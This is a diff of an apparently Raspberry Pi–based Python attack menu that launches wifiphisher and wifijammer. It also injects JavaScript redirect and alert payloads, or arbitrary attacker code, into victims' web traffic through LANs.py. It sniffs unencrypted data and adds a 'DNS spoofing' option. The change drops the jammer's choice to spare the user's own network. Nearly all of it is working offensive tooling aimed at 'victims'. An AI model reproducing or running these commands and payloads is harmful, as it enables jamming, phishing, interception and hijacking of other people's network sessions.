@@ -36,9 +36,10 @@ while True:
     \n'''
 
     SList = '''
-    1) Inject arbitrary HTML into pages
-    2) Capture images
+    1) Inject arbitrary Javascript into pages
+    2) Capture images [\033[1;31mNeed GUI\033[1;m]
     3) Sniffing non-HTTPS data they send or request
+    4) DNS spoofing
     \n'''
 
     if List == '1':
@@ -49,36 +50,23 @@ while True:
         elif HWList == '2':
             os.system('cd 0xHT4RPi/wifiphisher && wifiphisher')
     elif List == '2':
-        QAttack = raw_input('[=] Do you want to exclude your network from attack Y/n: ')
-        if QAttack == 'y' or QAttack == 'Y':
-            MAC = os.system('nmcli -f SSID,BSSID,CHAN,SIGNAL dev wifi list')
-            MAC = raw_input('\n[+] Enter MAC to exclude your network from attack\n > ')
-            MAC = 'cd 0xHT4RPi/wifijammer && sudo python wifijammer.py -s %s' % (MAC)
-            os.system(MAC)
-        else:
-            os.system('cd 0xHT4RPi/wifijammer && sudo python wifijammer.py')
+        os.system('cd 0xHT4RPi/wifijammer && sudo python wifijammer.py')
     elif List == '3':
         print SList
         SList = raw_input(" > ")
         if SList == '1':
             ExIndex = '''
-    1) Redirecting the victim to another Website
-    2) Inject alert Box
-    3) Inject Your HTML code
+    1) Inject alert Box
+    2) Inject Your Javascript code
             \n'''
             print ExIndex
             ExIndex = raw_input(' > ')
             if ExIndex == '1':
-                URL = raw_input("[-] Enter URL to redirecting the victim to another Website\n > ")
-                Redirecting = "'""<script>window.location.replace("'"'+URL+'"'");</script>""'"
-                Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (Redirecting))
-                os.system(Exploit)
-            elif ExIndex == '2':
                 Message = raw_input('[W] Write a message to your victim\n > ')
                 Alert = "'""<script>alert("'"'+Message+'"'");</script>""'"
                 Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (Alert))
                 os.system(Exploit)
-            elif ExIndex == '3':
+            elif ExIndex == '2':
                 HTML = raw_input("[*] Enter Your HTML Code\n > ")
                 Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (HTML))
                 os.system(Exploit)
@@ -87,6 +75,11 @@ while True:
             os.system(Exploit)
         elif SList == '3':
             Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -u -p -i wlan1')
+            os.system(Exploit)
+        elif SList == '4':
+            URL = raw_input("[-] Enter URL to redirecting the victim to another Website\n > ")
+            Redirecting = "'""<script>window.location.replace("'"'+URL+'"'");</script>""'"
+            Exploit = ('cd 0xHT4RPi/LANs.py && sudo python LANs.py -i wlan1 -c %s' % (Redirecting))
             os.system(Exploit)
     elif List == '99':
         QInstall = raw_input('[I] Do You Want To Install/Update Tools Y/n \n > ')
